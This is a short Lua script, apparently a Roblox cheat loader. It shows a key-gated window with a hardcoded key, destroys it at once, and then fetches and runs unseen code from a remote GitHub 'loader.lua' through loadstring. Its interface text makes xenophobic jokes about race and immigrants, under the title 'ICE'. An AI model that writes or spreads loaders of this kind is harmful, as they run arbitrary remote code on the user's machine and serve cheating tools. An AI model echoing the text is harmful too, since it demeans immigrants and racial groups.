local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "ICE",
   LoadingTitle = "Checking Race",
   LoadingSubtitle = "Dont resist...",
   ConfigurationSaving = { Enabled = false },
   KeySystem = true,
   KeySettings = {
      Title = "GIMME DA KEY",
      Subtitle = "Checking if u aint a immigrant",
      Note = "its ram123",
      FileName = "ScriptKeyConfiguration", 
      SaveKey = false, 
      GrabKeyFromUrl = "https://githubusercontent.com",
      Key = {"ram123"} 
   }
})

Rayfield:Destroy()

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xenowebo/loader/loader/loader.lua"))()
end)
